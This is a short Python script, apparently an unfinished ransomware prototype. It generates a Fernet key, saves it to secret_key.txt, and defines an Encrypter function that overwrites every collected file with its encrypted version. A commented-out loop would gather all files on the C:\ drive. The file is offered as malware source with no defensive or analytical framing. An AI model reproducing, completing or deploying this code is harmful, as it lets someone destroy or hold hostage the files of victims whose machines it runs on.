# Do not delete this mf!

import os
from cryptography.fernet import Fernet, InvalidToken
from colorama import Fore



AllFiles = []
FileCounter = 0
RootPath = os.path.expanduser("~")
DrivePath = "C:\\"

# for dir, subfolder, files in os.walk(DrivePath):
#     for filename in files:
#         Fullpath = os.path.join(dir,filename)
#         AllFiles.append(Fullpath)
#         FileCounter= FileCounter + 1
        
        

# print(f"{len(AllFiles)}file added")


# Encryption Step
secret_key = Fernet.generate_key()
with open("secret_key.txt","wb") as sec_key:
    sec_key.write(secret_key)
    
fernet = Fernet(secret_key)

def Encrypter():
    for file in AllFiles:
        try:
            with open(file,"rb") as target_file:
                original_content = target_file.read()
            encrypted_content = fernet.encrypt(original_content)
            with open(file,"wb") as target_file:
                target_file.write(encrypted_content)
        except PermissionError:
            print(f"Permission Error {file}")